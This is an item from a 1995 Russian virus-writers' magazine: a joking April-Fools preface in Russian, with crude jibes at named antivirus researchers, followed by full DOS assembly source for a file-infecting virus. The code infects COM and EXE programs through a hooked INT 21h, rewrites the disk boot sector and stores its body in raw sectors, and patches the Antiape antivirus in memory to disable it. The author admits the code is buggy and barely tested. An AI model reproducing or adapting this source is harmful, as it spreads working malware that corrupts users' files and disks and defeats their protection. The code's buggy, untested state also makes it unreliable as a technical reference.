      
          ▄▄                  █
         ▀▀▀ Monthly Magazine █ For VirMakers.                  APR '95
 	 ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  ██▀▀▀██
	  ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   ██ ▀▀██
	   █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     ██ █ ██
	   █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  ██▄▄▄██
	   ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄
	     (C) Copyright, 1994-95, by STEALTH group, unLtd. 	

;─── RCE-xxxx ───────────────────────────────────────────────────────────
;─ (C) Light general.────────────────────────────────────────────────────
; СМОТРЕТЬ ТОЛЬКО ПЕРВОГО АПРЕЛЯ!!!!
;		 И представилось мне,что спета моя песенка.
;			Николай Яблоков "Записки ПисиМиста".
; Господа - в этом файле я представил вирус который в моем инфекционном
;рассаднике не ушел дальше стандартного тестирования!
; В его отнюдь не робком теле содержится определенное количество глюков и
;неточностей.Но что поделать - ведь сей выпуск журнала приурочен ко дню ДУРАКА
;(прошу в мою сторону пальцами не тыкать).
; Сей почтенный вирус отнюдь не является каким<->либо стээлзом!Просто в заража-
;емый фак ... ой простите файл,он записывает скольки<->то байтный загрузчик
;вирусного тела которое (тело) записано по фиксированому адресу на диске.
; По своей кротости (пива я совсем не пью из-за язвы,сигареты не удерживаются
;в моих выщербленных зубах,а мое отвисшее чрево не позволяет заигрывать
;с девушками ... ччерт,ну и мерзости в голову лезут,да я как<->то забыл
;сказать,что когда я кручу колеса своей скрипучей креслы<->каталки,то
;ко мне сбегаются все обитатели моего скромного,захламленного подвала
;(а именно : пауки,тараканы,местный бомж Николаич,а также у нас иногда
;забивается труба в ватерклозете и оттуда выплывают всяческие хилые на вид
;куски),да так вот,когда я медленно подкатываюсь к груде ящиков служащих
;мне письменным столом,и тщательно слюнявя пальцы отбрасываю старые газеты
;прикрывающие мой Поцык... ой простите Поиск (производитель киевское ПО Электро-
;н Мош (да с грамотностью у меня не все в порядке)),а затем трясущимися
;руками достаю огарок свечи,непочтительно обгрызеный мышью (мышь мы с Николаичем
;вчера научили играть на Суржике и теперь она веселым пиликаньем скрашивает
;нашу утлую жизнь),и вот На Конец я могу включить свою т.н. мошыну!
;Минуты две,вглядываясь слезящимися глазами в подслеповатый экран дисплея,
;я обдумываю,какую же пакость я буду готовить бедным,немного глуповатым на вид
;пользователям программного оБЕЗпечения.Представляются мне супер,супер вирусы -
;которые обходят все заЩИТы ADinfa,представляю себе как в компьютерной сети NASA
;вдруг заведется мое детище,и как оно,назло всем т.н. программистам в среде
;Quick Basic выдаст в центре экрана интеллектуальную надпись :
;				Skagi BEBE!
;Но тут,мой дражайший читатель,я прикращу свое самобичевание - ибо суть в том,
;что завтра будет хорошая погода,я пойду к друзьям-вирмакам,выпью ПИВА,выкурю
;пачку сигарет (сие не достоинства но пороки),и наверняка в конце концов
;окажусь рядом с какой<->либо самочкой в достаточно близких отношениях ...
;(ДАМЫ НЕ ДУМАЙТЕ ОБО МНЕ ПРе(ПРи)ВРАТНО!!!!!!!!!!!)
;Но все дело втом,что жизнь идет своим чередом,Клуб высится над карликовым Фидо,
;Лозинский погряз под тяжестью рогов (в наследство от рогатых Хижняковских
;вирусов),Данилов безрадостно потирает буйну головушку в предчуствии аналогичных
;костных наростов,Касперский ...,а кто собственно уже вспомнит этого бесшабашно-
;го посылателя в различные части человеческой выделительной системы?,
;Мостовой - да,экая гора,экий могучий потенциал нерастраченой потенции!
;{Дядюшка отпусти свой ручник,который стискиваеш обеими руками,примени их в дол-
;жном месте (я совсем не ЭТО имел в виду ...)}
;(Подождите неделек пять,мы и до вас добе(еб)ремся).
; Да,пора закругляться с этой игрой слов!
; И так исходник вируса чуть ниже по тексту!
; Прошу не обижаться на возможные глюки (т.к. вирус тестирования на устойчивость
;работы почти не проходил (я его просто за пару часов на колбасил,откомпилил и
;запустил,и вроде работает)),и если у вас появится какое<->либо Ф.У. то подой-
;дитек зеркалу и некоторое время постойте подле него и по корчите себе самому
;всяческие уморительные рожицЫ,а после всего этого сотрите этот чертов файл
;и переформатите дискету (от A: до F: включительно)!!!!!!!!!!!!!!!!!!!!
;( С наилучшими пожеланиями в этот мартовский (ах черт,...весна на дворе)
;  вечер ---- Light General.)
;────────────────────────────────────────────────────────────────────────
cseg		segment
		assume	cs:cseg,ds:cseg
		org	100h

start:
		mov	bp,offset virr
		mov	si,bp
		call	hacked_mem
		mov	ah,09
		lea	dx,wrn
		int	21h
		mov	ax,4c00h
		int	21h
;--------------------------------------
wrn		db	'FRODO LIVES!$'
;--------------------------------------
;██████████████████████████████████████████████████████████████████████████████
;-───────────── Central Virus Body loader.────────────────────────────────────-
;██████████████████████████████████████████████████████████████████████████████
virr:
		call	$+3
		pop	bp
		sub	bp,03
		push	bp
		call	LoadBody	; Load Virus!
		pop	bp
;- COM or EXE ?---------------------------------------------------
		cmp	byte ptr cs:[bp+offset origin_2_byte-offset virr+1],'Z'
		jz	L_exe
;-Вocстановить три байта З.П.-------------------------------------
		mov	di,100h
		mov	si,offset origin_2_byte-offset virr
		add	si,bp
		push	di
		movsw
		movsw
		movsb
		xor	ax,ax	; For ramdisk.com!
		ret		; Go to infected com program.
;------------------------------------------------------------------
origin_2_byte	db	5 dup (90h)
;-Loaded from exe file.--------------------------------------------
L_exe:
		mov	ax,es
		add	ax,10h
		push	ax
		add	cs:[bp+offset CS_file-offset virr],ax
		pop	ax
SS_file:	add	ax,0000
		cli
		mov	ss,ax
SP_file:	mov	sp,0000
		sti
		db	0eah
IP_file		dw	?
CS_file		dw	?
;-------------------------------------------------------------------
LoadBody:
		xor	si,si
		mov	ds,[si+2ch]
search:
		clc
		mov	ax,0e0f0h	; Ver 1.0
		int	21h
		jc	ExitLoader	; Memory infected.
;------------------------------------------------
		lodsw
		dec	si
		test	ax,ax
		jnz	search
		add	si,3
;---------------------------------------------
		lodsb
		sub	al,'A'	; AL = disk for load.
		mov	cx,0001
		xor	dx,dx
		mov	bx,offset hacked_mem-offset virr
		add	bx,bp
		push	cs
		pop	ds
		mov	ds:[bp][offset reg_SI-offset virr][1],bp
		push	ax
		int	25h	; Read BOOT.
		pop	dx
		pop	ax
		jc	ExitLoader
		mov	dx,[bx+510]
		cmp	dx,0AA55h
		jz	ExitLoader
		mov	cx,0002
		int	25h	; Read virus body (2 - sectors).
		pop	dx
		cmp	word ptr [bx+(offset ID-offset hacked_mem)],'GL'
		jz	virus_body
ExitLoader:
		push	es
		pop	ds
		ret
virus_body:
reg_SI:		mov	si,0000		; 0BEh 0000h
;------------------------------------------------------------------------------

;██████████████████████████████████████████████████████████████████████████████
;-───────────── Virus Body (infector & hidder).───────────────────────────────-
;██████████████████████████████████████████████████████████████████████████████

hacked_mem	proc
		mov	bp,si
                push    es
;------------------------------------------------------------------
Cure_Antiape:
		cli
		mov	di,(offset mems-offset virr)
change_seg:
		mov	ax,ds:[di][bp]
		inc	di
		inc	di
		cmp	di,(offset mems-offset virr)+12
		jz	clear
		mov	cx,ax
		add	cx,1000h
		jmp	see_mem
inc_seg:
		mov	ax,es
		inc	ax
see_mem:
		mov	es,ax
		cmp	ax,cx
		jz	change_seg
l_loop:
		cmp	word ptr es:[03c9h],02ebh
		jnz	inc_seg
		cmp	word ptr es:[03cbh],40ebh
		jnz	inc_seg
found:
							; Antiape entry's!
		mov	word ptr es:[03b4h],04ebh	; int 27h
		mov	word ptr es:[03a6h],07ebh	; int 20h
		mov	word ptr es:[03c9h],9090h	; int 21h
							; Antiape DESTROYED!
;----------------------------------------------------------------------------
clear:
		pop	es
		mov	ax,es
		dec	ax
		mov	ds,ax
		sub	word ptr ds:[03],100h		;*
		sub	word ptr es:[02],100h		;*
		push	es
		mov	es,es:[02]
		push	cs
		pop	ds
		xor	di,di
		mov	cx,(offset ax_len-offset virr)/2
		rep	movsw
;-Install int.------------------------------------------------------
		mov	al,21h
		mov	dx,offset int_21h_entry-offset virr
		mov	si,offset ofs_21h-offset virr
		push	es
		pop	ds
		call	inst_int
		mov	di,bx
		mov	cx,es
;- Tracing int 21h.-
		mov	al,01h
		mov	dx,offset int_01h_entry-offset virr
		mov	si,offset ofs_01h-offset virr
		call	inst_int
;--
		cli
		pushf
		pushf
		pop	ax
		or	ax,0100h
		push	cs
		mov	dx,offset _@4-offset virr
		add	dx,bp
		push	dx
		push	ax
		push	cx
		push	di
		mov	ax,2501h
		lds	dx,ds:[si]
		mov	byte ptr es:[offset mode-offset virr],00
		iret
_@4:
		pop	ds
		push	ds
		pop	es
		ret		; goto infected program
hacked_mem	endp
;-Cure Antiape.----------------------------------------------------
mems		dw	0000h,0B000h,0D000h,0FFFFh ; Segs DOS mem.
;------------------------------------------------------------------
;███████████████████████████████████████████████████████████████████████████████
;-───────────── INT 21h - Entry point.─────────────────────────────────────────-
;███████████████████████████████████████████████████████████████████████████████

int_21h_entry	proc
		cmp	ax,0e0f0h	;-Если собрат спрашивает о наличии
		jnz	_@1		;-своей родни то дать дружеский ответ.
		stc			;-
		retf	2		;-

_@1:
		cmp	ax,4b00h	; Exec.
		jz	infecting_exec
		cmp	ah,3eh		; Close
		jnz	exit_all
		mov	byte ptr cs:[offset Close_mode-offset virr],0f8h ; CLC
		jmp	infecting
exit_date:
		mov	ax,5701h
		mov	cx,es:[di+13]
		mov	dx,es:[di+15]
		int	0d4h
exit_close:
		cmp	byte ptr cs:[offset Close_mode-offset virr],0f8h
		jz	exit_pop
		mov	ah,3eh
		int	0d4h
exit_pop:
		lds	dx,cs:[offset ofs_24h-offset virr]
		mov	ax,2524h
		int	0d4h
		pop	bp
		pop	ds
		pop	es
		pop	di
		pop	si
		pop	dx
		pop	cx
		pop	bx
		pop	ax
exit_all:
		db	0eah
ofs_21h		dw	0000
seg_21h		dw	0000
int_21h_entry	endp
;-------------------------------------------------------------------
infecting_exec:
		mov	byte ptr cs:[offset Close_mode-offset virr],0f9h ; STC
infecting:
		push	ax
		push	bx
		push	cx
		push	dx
		push	si
		push	di
		push	es
		push	ds
		push	bp
		push	ds
		push	dx
		push	bx
;------------------------------------------------------------------
		push	cs
		pop	ds
		mov	al,24h
		mov	si,offset ofs_24h-offset virr
		mov	dx,offset int_24h_entry-offset virr
		call	inst_int
		pop	bx
		pop	dx
		pop	ds
;-------------------------------------------------------------------
Close_mode:	stc
		jc	f_Mz
		push	bx
		call	diskryptor
		pop	bx
		jc	exit_pop
		xor	dx,dx
		mov	es:[di+21],dx
		mov	es:[di+23],dx
		jmp	OpenOk
;-Первые байты файла -'MZ'?-----------------------------------------
f_Mz:
		mov	ax,3d00h
		int	0d4h
		jc	exit_pop
		xchg	ax,bx
OpenOk:
		mov	si,dx
		lodsw
		push	cs
		pop	ds
		mov	ds:[offset Drive-offset virr],ax	; Drive!
;--------------------------------------------------------
		mov	ah,3fh
		mov	cx,05
		mov	dx,offset origin_2_byte-offset virr
		int	0d4h
		jc	_1
		cmp	byte ptr ds:[offset origin_2_byte-offset virr+1],'Z'
		jz	_EXE
		cmp	word ptr ds:[offset origin_2_byte-offset virr+3],'$$'
		jz	_1
;-Infect .COM --------------------------------
		call	InfectSFT
		jc	_1
		cmp	bp,65000
		ja	_1			;Длина больше допустимой.
		mov	es:[di+21],bp		;F.p. = end file.
;-Make JMP------------------------------------
		sub	bp,03
		mov	ds:[offset jmp_n-offset virr],bp
		mov	ah,40h
		mov	cx,offset hacked_mem-offset virr
		int	0d4h
		jc	_1b
		cmp	ax,cx
		jnz	_1b
		mov	es:[di+21],dx
		mov	ah,40h
		mov	cx,05h
		mov	dx,offset new_3_byte-offset virr
		int	0d4h
_1b:		jmp	exit_date
_1:		jmp	exit_close
;-Infect .EXE ---------------------------------
_EXE:
		call	InfectSFT
		jc	_1
		mov	es:[di+21],dx		; F.p.= start file
		mov	ah,3fh
		mov	cx,18h			; Read header.
		mov	dx,offset header-offset virr
		mov	si,dx
		int	0d4h
		jc	_1
		cmp	ds:[si+12h],1994h	; Already infected ?
		jz	_1			; Yes!
		mov	ax,ds:[si+4]		; Pages (512b).
		dec	ax
		mov	cx,512
		mul	cx
		add	ax,[si+2]	; AX = File len from header.
		cmp	ax,bp		; Real file len = ax ?
		jnz	_1		; No - this is overlay.
;-----
_5:
		mov	es:[di+21],ax	; F.p.= end file.
		mov	es:[di+23],dx
;-Get header.-----------------------------------
		mov	[si+12h],1994h
		mov	ax,[si+14h]
		mov	ds:[offset IP_file-offset virr],ax
		mov	ax,[si+16h]
		mov	ds:[offset CS_file-offset virr],ax
		mov	ax,[si+10h]
		mov	ds:[offset SP_file-offset virr][1],ax
		mov	ax,[si+0eh]
		mov	ds:[offset SS_file-offset virr][1],ax
;-----------------------------------------------
		xchg	ax,bp
		mov	cx,10h
		div	cx
		sub	ax,[si+8]
		sbb	dx,0
		mov	[si+16h],ax	; ReloCS.
		mov	[si+0eh],ax	; ReloSS
		mov	[si+14h],dx	; ExeIP.
		mov	[si+10h],0ffffh	; ExeSP
;-Correcting file len in header.----------------
		mov	ax,[si+4]	; Число блоков по 512 байтов.
		mov	cx,[si+2]	; Число байтов в последнем блоке.
		add	cx,offset hacked_mem-offset virr
		cmp	cx,200h
		jb	_g
		sub	cx,200h
		inc	ax
_g:
		mov	[si+4],ax
		mov	[si+2],cx
;-Write virus in file.--------------------------
		xor	dx,dx
		mov	cx,offset hacked_mem-offset virr
		mov	ah,40h
		int	0d4h
		jc	_a
		cmp	ax,cx
		jnz	_a
;-Write new header.-----------------------------
		mov	es:[di+21],dx		; F.p.= start file.
		mov	es:[di+23],dx		;
		mov	cx,18h
		mov	ah,40h
		mov	dx,offset header-offset virr
		int	0d4h
_a:		jmp	exit_date
;----------------------------------------------
InfectSFT:
		push	bx
		call	diskryptor
		push	bp
		push	di
		jc	ExitSFT_pop
		cmp	byte ptr ds:[offset Drive-offset virr+1],':'
		jz	NameOk
		mov	ah,19h	; Get current drive.
		int	21h
		jmp	_10
NameOk:
		mov	al,ds:[offset Drive-offset virr]
		sub	al,'A'
_10:
		xor	dx,dx
		mov	cx,0001
		mov	bx,offset BOOT-offset virr
		push	ax
		int	25h
		pop	dx
		pop	si
		jc	ExitSFT_pop
		mov	dx,ds:[bx+510]
		cmp	dx,0AA55h
		jz	Calculate
		cmp	dx,0000
		jnz	ExitSFT_clc
;- Вычислим абс.сектор для записи своего тела.---------------
;(Формула из "Дисковая подсистема IBM-совместимых PC" стр.65)
Calculate:
		mov	ax,32
		mul	word ptr [bx+11h]
		div	word ptr [bx+0bh]
		add	ax,[bx+0eh]
		push	ax
		push	dx
		sub	dx,dx
		mov	ax,[bx+16h]
		mul	byte ptr [bx+10h]
		pop	dx
		pop	cx
		add	ax,cx
		mov	cl,[bx+0dh]
		sub	ch,ch
		add	ax,cx
		sub	ax,4
		push	ax	; AX - abs.sector for write!
				;(AX указывает на [НАЧАЛО ДАННЫХ-2]).
;- Write BOOT.-----------------------------------------
		mov	ds:[bx+510],ax
		mov	ax,si
		mov	cx,0001
		xor	dx,dx
		push	ax
		int	26h
		pop	ax
		pop	ax
		pop	dx
		jc	ExitSFT_pop
;- Write body in clasters.-----------------------------
		mov	cx,0002
		mov	bx,offset hacked_mem-offset virr
		int	26h
		pop	dx
ExitSFT_clc:
		clc
ExitSFT_pop:
		pop	di
		pop	bp
		pop	bx
		mov	dx,0000
		ret
;----------------------------------------------
diskryptor	proc
		mov	ax,1220h
		int	2fh
		mov	bl,es:[di]
		mov	ax,1216h
		int	2fh
		mov	byte ptr es:[di+2],02	; mode = r/w.
		mov	bp,es:[di+17]
		cmp	word ptr es:[di+40],'OC'	; COm!
		jz	exit_d
		cmp	word ptr es:[di+41],'EX'	; eXE!
		jz	exit_d
exit_xx:
		stc
		ret
exit_d:
		cmp	word ptr es:[di+32],'OC'	; COmmand.com!
		jz	exit_xx
		clc
		ret
diskryptor	endp
;-----------------------------------------------
int_24h_entry	proc
		mov	al,03
		iret
int_24h_entry	endp
;-----------------------------------------------
int_01h_entry	proc
		push	bp
		mov	bp,sp
		cmp	cs:mode,00
		jz	trace
stop:
		and	[bp+06],0feffh
		mov	cs:mode,01
		pop	bp
		iret
trace:
		cmp	word ptr [bp+4],0300h
		jb	save
		cmp	word ptr [bp+4],0c800h
		ja	save
		pop	bp
		iret
save:
		push	ds
		push	bx
		push	es
		xor	bx,bx
		mov	es,bx
		lds	bx,dword ptr [bp+2]
		mov	es:[0d4h*4],bx
		mov	es:[(0d4h*4)+2],ds
		pop	es
		pop	bx
		pop	ds
		jmp	stop
int_01h_entry	endp
;------------------------------------------------
inst_int	proc
		push	ax
		mov	ah,35h
		int	21h
		mov	ds:[si],bx
		mov	ds:[si+2],es
		pop	ax
		mov	ah,25h
		int	21h
		ret
inst_int	endp
;-----------------------------
	db	13,10,'(c) Light General.',13,10
;-----------------------------
ID		db	'LG'
;-----------------------------
new_3_byte	db	0e9h
jmp_n		dw	0000
		db	'$$'
;-----------------------------
		db	?
ax_len		db	?
Drive		dw	?
ofs_24h		dw	?
seg_24h		dw	?
mode		db	?
ofs_01h		dw	2 dup (?)
BOOT		db	512 dup (?)
;-Header for EXE file.------------------
header		dw	?	; MZ
		dw	?
pages		dw	?	; Len file in pages (512b.)
		dw	3 dup (?)
seg_stack	dw	?	; SS
ofs_stack	dw	?	; SP
		dw	?	; Контрольная сумма.
ofs_run		dw	?	; IP
seg_run		dw	?	; CS
;---------------------------------------

;***********************************************
cseg		ends
		end	start